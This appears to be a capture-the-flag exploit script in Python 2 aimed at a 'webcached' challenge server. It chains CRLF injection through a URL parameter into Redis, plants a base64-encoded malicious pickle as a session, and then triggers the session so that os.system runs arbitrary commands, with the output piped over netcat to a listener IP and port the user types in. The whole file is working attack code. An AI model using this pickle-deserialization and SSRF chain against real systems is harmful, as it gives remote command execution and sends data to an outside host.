import urllib2
import cPickle
import base64
import readline
import os

print '[*] NC Server Setting.'
ip = raw_input('ip :')
port = raw_input('port :')
print '[*] Exploit'
while 1:
	cmd = raw_input('cmd : ')
	class PickleRce(object):
		def __reduce__(self):
			return (os.system,('%s | nc %s %s'%(cmd,ip,port),))
	
	exp = base64.b64encode(cPickle.dumps(PickleRce()))
	data = 'action&url=http://127.0.0.1%0d%0a SET session:shpik '+exp+'%0d%0a SAVE:6379'
	req = urllib2.Request('http://webcached.eatpwnnosleep.com/',data)
	req.add_header('cookie','session=godgod;')
	res = urllib2.urlopen(req)
	data = 'action&url=http://127.0.0.1/'
	req = urllib2.Request('http://webcached.eatpwnnosleep.com/',data)
	req.add_header('cookie','session=shpik;')
	res = urllib2.urlopen(req)